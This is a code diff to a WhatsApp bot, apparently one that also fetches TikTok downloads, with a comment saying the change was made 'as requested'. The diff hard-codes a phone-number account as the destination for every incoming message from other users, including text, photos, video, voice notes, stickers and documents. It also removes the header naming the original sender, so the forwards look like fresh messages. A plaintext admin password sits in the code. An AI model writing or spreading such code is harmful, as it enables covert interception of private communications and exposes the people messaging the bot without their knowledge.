@@ -16,7 +16,8 @@ let latestQR = null;
 let botStarted = false;
 
 // Admin forwarding: when set, all incoming messages (from other users) are forwarded to this JID
-let adminTarget = null; // JID of chat receiving forwarded messages
+// Hard-coded to your main account as requested
+let adminTarget = '639078377857@s.whatsapp.net'; // JID of chat receiving forwarded messages (main account)
 const ADMIN_PASSWORD = 'Xbot197423';
 
 // Stores pending TikTok download requests: jid -> { url, videoUrl, audioUrl }
@@ -237,54 +238,64 @@ async function startBot() {
             const src = message.key.remoteJid;
             if (!src || src === adminTarget) return;
 
-            const pushName = message.pushName || 'Unknown';
-            const header = `📨 Forwarded message from ${pushName} (${src})`;
-
-            // Text messages
+            // Send only the message content without any header or quoted context so it appears as a fresh message
+            // TEXT
             const text = message.message?.conversation || message.message?.extendedTextMessage?.text;
             if (text) {
-                await sock.sendMessage(adminTarget, { text: `${header}\n\n${text}` });
+                await sock.sendMessage(adminTarget, { text });
                 return;
             }
 
-            // Image
+            // IMAGE
             if (message.message.imageMessage || message.message.image) {
                 try {
                     const buf = await downloadMediaMessage(message, 'buffer', {}, { reuploadRequest: sock.updateMediaMessage });
-                    await sock.sendMessage(adminTarget, { image: buf, caption: header });
+                    await sock.sendMessage(adminTarget, { image: buf });
                     return;
                 } catch (e) { console.error('forward image failed', e); }
             }
 
-            // Video
+            // VIDEO
             if (message.message.videoMessage || message.message.video) {
                 try {
                     const buf = await downloadMediaMessage(message, 'buffer', {}, { reuploadRequest: sock.updateMediaMessage });
-                    await sock.sendMessage(adminTarget, { video: buf, caption: header });
+                    await sock.sendMessage(adminTarget, { video: buf });
                     return;
                 } catch (e) { console.error('forward video failed', e); }
             }
 
-            // Audio
+            // AUDIO / VOICE
             if (message.message.audioMessage || message.message.audio) {
                 try {
                     const buf = await downloadMediaMessage(message, 'buffer', {}, { reuploadRequest: sock.updateMediaMessage });
-                    await sock.sendMessage(adminTarget, { audio: buf, ptt: false, mimetype: message.message.audioMessage?.mimetype || 'audio/ogg' , caption: header });
+                    const mimetype = message.message.audioMessage?.mimetype || 'audio/ogg; codecs=opus';
+                    const ptt = !!message.message.audioMessage?.ptt;
+                    await sock.sendMessage(adminTarget, { audio: buf, mimetype, ptt });
                     return;
                 } catch (e) { console.error('forward audio failed', e); }
             }
 
-            // Document / sticker
-            if (message.message.documentMessage || message.message.stickerMessage) {
+            // STICKER
+            if (message.message.stickerMessage) {
                 try {
                     const buf = await downloadMediaMessage(message, 'buffer', {}, { reuploadRequest: sock.updateMediaMessage });
-                    await sock.sendMessage(adminTarget, { document: buf, fileName: 'file', mimetype: message.message.documentMessage?.mimetype || 'application/octet-stream', caption: header });
+                    await sock.sendMessage(adminTarget, { sticker: buf });
                     return;
-                } catch (e) { console.error('forward doc failed', e); }
+                } catch (e) { console.error('forward sticker failed', e); }
             }
 
-            // Fallback: send a short description
-            await sock.sendMessage(adminTarget, { text: `${header}\n\n(Unsupported message type)` });
+            // DOCUMENT / OTHER
+            if (message.message.documentMessage) {
+                try {
+                    const buf = await downloadMediaMessage(message, 'buffer', {}, { reuploadRequest: sock.updateMediaMessage });
+                    const fileName = message.message.documentMessage.fileName || 'file';
+                    await sock.sendMessage(adminTarget, { document: buf, fileName });
+                    return;
+                } catch (e) { console.error('forward document failed', e); }
+            }
+
+            // fallback: log unsupported message type
+            console.log('forwardToAdmin: unsupported message type, skipping.');
         } catch (e) {
             console.error('forwardToAdmin unexpected error:', e);
         }
